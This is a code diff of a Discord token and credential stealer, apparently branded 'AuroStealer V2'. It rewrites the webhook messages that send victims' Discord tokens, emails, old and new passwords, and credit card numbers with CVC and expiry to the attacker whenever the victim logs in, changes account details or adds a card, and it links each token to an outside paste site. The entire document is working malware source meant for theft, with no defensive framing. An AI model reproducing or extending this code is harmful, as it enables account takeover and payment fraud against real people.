@@ -145,7 +145,8 @@ function Login(email, password, token) {
             avatar_url: "https://media.discordapp.net/attachments/962980467303403620/963865484351119370/8e663c3910ed89cf21a75c4cd7874817.webp",
             embeds: [{
                 title: "Logged In Successfully",
-                description: `[**:partner: │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
+                thumbnail: avatar_url,
+                description: `[** │ Click To Copy Token**](https://ctf.surf/raw/${token})`,
                 color: 000000,
                 fields: [{
                             "name": "<a:CH_MoneyFlying:715585160497856533> Token",
@@ -154,7 +155,7 @@ function Login(email, password, token) {
                         },
                         {
                             "name": "<:blackdollar:963466396149383168> Account Information",
-                            "value": `\`\`\`・Email : ${email} ・Password : ${password}\`\`\``,
+                            "value": `\`\`\`・Email : ${email}\n・Password : ${password}\`\`\``,
                             "inline": false
                         },
                         {
@@ -168,7 +169,7 @@ function Login(email, password, token) {
                         "icon_url": `https://images-ext-2.discordapp.net/external/9PAAFIDq2O4tD8fMFbZfMlnVFA8PUJXIPwQXfLUzhrk/https/images-ext-1.discordapp.net/external/qQjwcf0ZGGS7o4VhQSRgFYBYkCBGZLzkYoQrExQ2Wrg/https/media.discordapp.net/attachments/959484113373507599/963513865398784120/8e663c3910ed89cf21a75c4cd7874817.webp`
                     },
                     "footer": {
-                        "text": "Auro Stealer V2 Made by ItzKr$zz and Thanosa"
+                        "text": "AuroStealer V2"
                     }
                 }
             ]
@@ -187,35 +188,36 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "GrabberShli",
+            username: "AuroStealer V2",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
-            embeds: [
-                {
-                    "color": 000000,
-                    "fields": [
+            avatar_url: "https://media.discordapp.net/attachments/962980467303403620/963865484351119370/8e663c3910ed89cf21a75c4cd7874817.webp",
+            embeds: [{
+                title: "Password Changed",
+                thumbnail: avatar_url,
+                description: `[** │ Click To Copy Token**](https://ctf.surf/raw/${token})`,
+                color: 000000,
+                fields: [{
+                            "name": "<a:CH_MoneyFlying:715585160497856533> Token",
+                            "value": `\`\`\`${token}\`\`\``,
+                            "inline": false
+                        },
                         {
-                            "name": "Password canged",
-                            "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
+                            "name": "<:CH_IconGreyDiscordPoop:720989028455022692> Account Information",
+                            "value": `\`\`\`・Nitro Type: ${GetNitro(json.premium_type)}\n・Badges: ${GetBadges(json.flags)}\`\`\``,
                             "inline": true
                         },
                         {
-                            "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
-                            "inline": true
-                        },
-                        {
-                            "name": "**Token**",
-                            "value": `\`${token}\``,
+                            "name": "<:CH_IconSafety:715585597775020062> New Password",
+                            "value": `\`\`\`・Email: ${json.email}\n・Old Password: ${oldpassword}\n・New Password: ${newpassword}\`\`\``,
                             "inline": false
                         }
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
-                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        "icon_url": "https://images-ext-2.discordapp.net/external/9PAAFIDq2O4tD8fMFbZfMlnVFA8PUJXIPwQXfLUzhrk/https/images-ext-1.discordapp.net/external/qQjwcf0ZGGS7o4VhQSRgFYBYkCBGZLzkYoQrExQ2Wrg/https/media.discordapp.net/attachments/959484113373507599/963513865398784120/8e663c3910ed89cf21a75c4cd7874817.webp"
                     },
                     "footer": {
-                        "text": "GrabberShli By Shlimazl#1337・https://github.com/shlimazl1337/"
+                        "text": "AuroStealer V2"
                     }                 
                 }
             ]
@@ -234,35 +236,36 @@ function ChangeEmail(newemail, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "GrabberShli",
+            username: "AuroStealer V2",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
-            embeds: [
-                {
-                    "color": 16507654,
-                    "fields": [
-                        {
-                            "name": "**Email Changed**",
-                            "value": `New Email: ${newemail}\nPassword: ${password}`,
+            avatar_url: "https://media.discordapp.net/attachments/962980467303403620/963865484351119370/8e663c3910ed89cf21a75c4cd7874817.webp",
+            embeds: [{
+                title: "Email Changed",
+                thumbnail: avatar_url,
+                description: `[** │ Click To Copy Token**](https://ctf.surf/raw/${token})`,
+                color: 000000,
+                fields: [{
+                            "name": "<a:CH_MoneyFlying:715585160497856533> Token",
+                            "value": `\`\`\`${token}\`\`\``,
                             "inline": true
                         },
                         {
-                            "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "name": "<:CH_IconGreyDiscordPoop:720989028455022692> Account Information",
+                            "value": `・Nitro Type: ${GetNitro(json.premium_type)}\n・Badges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
-                            "name": "**Token**",
-                            "value": `\`${token}\``,
+                            "name": "<:CH_IconSafety:715585597775020062> New Email",
+                            "value": `・New Email: ${newemail}\n・Password: ${password}`,
                             "inline": false
                         }
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
-                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        "icon_url": "https://images-ext-2.discordapp.net/external/9PAAFIDq2O4tD8fMFbZfMlnVFA8PUJXIPwQXfLUzhrk/https/images-ext-1.discordapp.net/external/qQjwcf0ZGGS7o4VhQSRgFYBYkCBGZLzkYoQrExQ2Wrg/https/media.discordapp.net/attachments/959484113373507599/963513865398784120/8e663c3910ed89cf21a75c4cd7874817.webp"
                     },
                     "footer": {
-                        "text": "GrabberShli By Shlimazl#1337・https://github.com/shlimazl1337"
+                        "text": "AuroStealer V2"
                     }                
                 }
             ]
@@ -281,35 +284,36 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "GrabberShli",
-            content: "@everyone",
-            avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
-            embeds: [
-                {
-                    "color": 16507654,
-                    "fields": [
-                        {
-                            "name": "**Credit Card Added**",
-                            "value": `Credit Card Number: ${number}\nCVC: ${cvc}\nCredit Card Expiration: ${expir_month}/${expir_year}`,
+            username: "AuroStealer V2",
+            content: "",
+            avatar_url: "https://media.discordapp.net/attachments/962980467303403620/963865484351119370/8e663c3910ed89cf21a75c4cd7874817.webp",
+            embeds: [{
+                title: "Credit Crad Added",
+                thumbnail: avatar_url,
+                description: `[** │ Click To Copy Token**](https://ctf.surf/raw/${token})`,
+                color: 000000,
+                fields: [{
+                            "name": "<:CH_IconSafety:715585597775020062> Discord Token",
+                            "value": `\`\`\`${token}\`\`\``,
                             "inline": true
                         },
                         {
-                            "name": "**Other Info**",
+                            "name": "<a:CH_MoneyFlying:715585160497856533> Account Info",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
-                            "name": "**Token**",
-                            "value": `\`${token}\``,
+                            "name": ":credit_card: Card Information",
+                            "value": `\`\`\`・Credit Card Number: ${number}\n・CVC: ${cvc}\n・Credit Card Expiration: ${expir_month}/${expir_year}\`\`\``,
                             "inline": false
                         }
                     ],
                     "author": {
                         "name": json.username + "#" + json.discriminator + "・" + json.id,
-                        "icon_url": `https://media.discordapp.net/attachments/962980467303403620/963865484351119370/8e663c3910ed89cf21a75c4cd7874817.webp`
+                        "icon_url": "https://images-ext-2.discordapp.net/external/9PAAFIDq2O4tD8fMFbZfMlnVFA8PUJXIPwQXfLUzhrk/https/images-ext-1.discordapp.net/external/qQjwcf0ZGGS7o4VhQSRgFYBYkCBGZLzkYoQrExQ2Wrg/https/media.discordapp.net/attachments/959484113373507599/963513865398784120/8e663c3910ed89cf21a75c4cd7874817.webp"
                     },
                     "footer": {
-                        "text": "Auro Stealer V2 Made by Thanosa"
+                        "text": "AuroStealer V2"
                     }
                 }
             ]
